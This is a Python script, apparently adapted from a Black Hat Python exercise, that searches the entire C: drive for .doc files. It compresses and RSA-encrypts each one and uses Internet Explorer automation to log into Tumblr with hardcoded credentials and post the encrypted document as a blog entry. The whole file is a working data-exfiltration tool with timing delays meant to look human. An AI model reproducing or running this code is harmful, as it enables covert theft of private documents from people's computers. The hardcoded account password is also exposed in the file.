import win32com.client
import os
import fnmatch
import time
import random
import zlib
import base64
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

# Settings
doc_type = ".doc"
username = "jms@bughunter.ca"
password = "justinBHP2014"
public_key = ""  # <-- Make sure to set this properly with a valid PEM key string

def wait_for_browser(browser):
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)

def encrypt_string(plaintext):
    chunk_size = 256
    print(f"Compressing: {len(plaintext)} bytes")
    plaintext = zlib.compress(plaintext)
    print(f"Encrypting: {len(plaintext)} bytes")

    rsakey = RSA.import_key(public_key)
    cipher = PKCS1_OAEP.new(rsakey)

    encrypted = b""
    offset = 0

    while offset < len(plaintext):
        chunk = plaintext[offset:offset + chunk_size]
        if len(chunk) % chunk_size != 0:
            chunk += b" " * (chunk_size - len(chunk))
        encrypted += cipher.encrypt(chunk)
        offset += chunk_size

    encoded = base64.b64encode(encrypted).decode()
    print(f"Base64 encoded crypto: {len(encoded)}")
    return encoded

def encrypt_post(filename):
    with open(filename, "rb") as f:
        contents = f.read()
    encrypted_title = encrypt_string(filename.encode())
    encrypted_body = encrypt_string(contents)
    return encrypted_title, encrypted_body

def random_sleep():
    time.sleep(random.randint(5, 10))

def login_to_tumblr(ie):
    full_doc = ie.Document.all
    for i in full_doc:
        try:
            if i.id == "signup_email":
                i.setAttribute("value", username)
            elif i.id == "signup_password":
                i.setAttribute("value", password)
        except:
            continue
    random_sleep()
    try:
        if ie.Document.forms[0].id == "signup_form":
            ie.Document.forms[0].submit()
        else:
            ie.Document.forms[1].submit()
    except IndexError:
        pass
    random_sleep()
    wait_for_browser(ie)

def post_to_tumblr(ie, title, post):
    full_doc = ie.Document.all
    title_box = None
    post_form = None

    for i in full_doc:
        try:
            if i.id == "post_one":
                i.setAttribute("value", title)
                title_box = i
                i.focus()
            elif i.id == "post_two":
                i.setAttribute("innerHTML", post)
                print("Set text area")
                i.focus()
            elif i.id == "create_post":
                print("Found post button")
                post_form = i
                i.focus()
        except:
            continue

    random_sleep()
    if title_box and post_form:
        title_box.focus()
        random_sleep()
        post_form.children[0].click()
        wait_for_browser(ie)
        random_sleep()

def exfiltrate(document_path):
    ie = win32com.client.Dispatch("InternetExplorer.Application")
    ie.Visible = 1
    print("Logging in...")
    ie.Navigate("http://www.tumblr.com/login")
    wait_for_browser(ie)

    login_to_tumblr(ie)

    print("Navigating to new post page...")
    ie.Navigate("https://www.tumblr.com/new/text")
    wait_for_browser(ie)

    title, body = encrypt_post(document_path)
    print("Creating new post...")
    post_to_tumblr(ie, title, body)
    print("Posted!")

    ie.Quit()
    ie = None

def main():
    for parent, directories, filenames in os.walk("C:\\"):
        for filename in fnmatch.filter(filenames, f"*{doc_type}"):
            document_path = os.path.join(parent, filename)
            print(f"Found: {document_path}")
            exfiltrate(document_path)
            input("Continue?")

if __name__ == "__main__":
    main()
